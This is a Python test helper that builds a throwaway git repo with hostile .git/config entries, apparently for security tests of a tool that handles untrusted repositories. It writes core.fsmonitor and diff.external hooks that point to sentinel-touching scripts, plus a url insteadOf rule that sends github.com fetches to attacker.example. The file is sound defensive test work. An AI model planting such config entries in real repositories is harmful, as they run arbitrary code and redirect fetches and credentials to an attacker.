"""Shared helpers for hostile ``.git/config`` RED tests (lane A / AP1)."""

from __future__ import annotations

import stat
import subprocess
from dataclasses import dataclass
from pathlib import Path


@dataclass(frozen=True, slots=True)
class HostileGitRepo:
    """Real git checkout with attacker-controlled ``.git/config`` entries."""

    root: Path
    fsmonitor_sentinel: Path
    diff_external_sentinel: Path
    insteadof_leak_path: Path


def _git(repo: Path, *args: str) -> None:
    result = subprocess.run(
        ["git", *args],
        cwd=repo,
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0, f"git {' '.join(args)}: {result.stderr}"


def build_hostile_git_repo(tmp_path: Path) -> HostileGitRepo:
    """Create a throwaway repo whose ``.git/config`` models MCB-01 vectors."""
    repo = tmp_path / "hostile-git"
    repo.mkdir()
    fsmonitor_sentinel = tmp_path / "fsmonitor-pwned"
    diff_external_sentinel = tmp_path / "diff-external-pwned"
    insteadof_leak_path = tmp_path / "insteadof-leaked.txt"

    evil_fsmonitor = tmp_path / "evil-fsmonitor.sh"
    evil_fsmonitor.write_text(
        f"#!/bin/sh\ntouch {fsmonitor_sentinel}\n",
        encoding="utf-8",
    )
    evil_fsmonitor.chmod(evil_fsmonitor.stat().st_mode | stat.S_IXUSR)

    evil_diff = tmp_path / "evil-diff.sh"
    evil_diff.write_text(
        f"#!/bin/sh\ntouch {diff_external_sentinel}\n",
        encoding="utf-8",
    )
    evil_diff.chmod(evil_diff.stat().st_mode | stat.S_IXUSR)

    _git(repo, "init", "-b", "main")
    _git(repo, "config", "user.email", "hostile@example.com")
    _git(repo, "config", "user.name", "hostile")
    (repo / "README.md").write_text("hostile\n", encoding="utf-8")
    _git(repo, "add", "README.md")
    _git(repo, "commit", "-m", "init")

    config_path = repo / ".git" / "config"
    config_path.write_text(
        config_path.read_text(encoding="utf-8")
        + f"""
[core]
\tfsmonitor = {evil_fsmonitor}
[diff]
\texternal = {evil_diff}
[url "https://attacker.example/"]
\tinsteadOf = https://github.com/
""",
        encoding="utf-8",
    )

    return HostileGitRepo(
        root=repo,
        fsmonitor_sentinel=fsmonitor_sentinel,
        diff_external_sentinel=diff_external_sentinel,
        insteadof_leak_path=insteadof_leak_path,
    )
